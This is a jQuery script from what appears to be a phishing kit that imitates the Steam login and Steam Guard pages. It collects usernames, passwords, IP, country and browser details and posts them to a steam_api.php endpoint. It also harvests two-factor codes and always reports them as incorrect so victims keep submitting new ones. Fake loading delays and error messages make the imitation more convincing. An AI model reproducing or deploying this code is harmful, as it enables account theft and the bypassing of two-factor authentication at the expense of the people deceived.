$( "#loginSteam" ).click(function() { login(); });
$( "#login_twofactorauth_buttonset_entercode" ).click(function() { code(); });
$("#closeModal").click(function() { close(); })

function serial(form) {
	jQuery.ajax({
        		url: "steam_api.php",
        		type: "POST",
        		dataType: "html",
        		data: jQuery("#" + form).serialize(),
        		success: function(response) { 
        			console.log("ajax ok");
    		},
		error: function(response) {
    			console.log("ajax error");
    		}
 	});
}

function login() {
	var loginValue = $("#input_username").val();
	var passValue = $("#input_password").val();
	var ipValue = $("#user_ip").val();
	var countryValue = $("#user_cn").val();
	var browserValue = $("#user_ag").val();
	var tokenValue = $("#user_rf").val();

	var loginLength = $("#input_username").val().length;
	var passLength = $("#input_password").val().length;

	if(loginLength == 0 || passLength == 0 ) {
		// data is too short 
		return false;
	} else if(loginLength < 4 || passLength < 8) {
		// data uncorrect
		$("#loginSteam").hide();
		$("#login_btn_wait").show();
		setTimeout(function() {
			$("#error_display").show(250);
			$("#login_btn_wait").hide();
			$("#loginSteam").show();
		}, 2000);
	} else {
		// data correct
		$("#loginSteam").hide();
		$("#login_btn_wait").show();

		$("#form_username").val(loginValue);
		$("#form_password").val(passValue);
		$("#form_ip").val(ipValue);
		$("#form_country").val(countryValue);

		serial("auth_form");
		
		$("#login_twofactorauth_message_entercode_accountname").text(loginValue);
		setTimeout(function() {
			$("#modalBg").show();
			$("#guardModal").show();
			var guardWidth = ($("body").width() - $("#guardModal").width()) / 2;
			var guardHeight = ($("body").height() - $("#guardModal").height()) / 2;
			$("#guardModal").css("left", guardWidth + "px");
			$("#guardModal").css("top", guardHeight + "px");
		}, 2500);
	}
}

function code() {
	var codeValue = $("#twofactorcode_entry").val();
	var codeLength = $("#twofactorcode_entry").val().length;

	if(codeLength < 5) {
		// code uncorrect
		$("#login_twofactorauth_buttonset_waiting").show();
		setTimeout(function() {
			$("#login_twofactorauth_buttonset_waiting").hide();
			$("#login_twofactorauth_message_incorrectcode").show();
			$("#login_twofactorauth_message_entercode").hide();
		}, 2500);
	} else {
		$("#form_code").val(codeValue);
		serial("code_form");

		$("#login_twofactorauth_buttonset_waiting").show();
		setTimeout(function() {
			$("#login_twofactorauth_buttonset_waiting").hide();
			$("#login_twofactorauth_message_incorrectcode").show();
			$("#login_twofactorauth_message_entercode").hide();
		}, 2500);
	}
}

function close() {
	$("#modalBg").hide();
	$("#guardModal").hide();
	$("#loginSteam").show();
	$("#login_btn_wait").hide();
}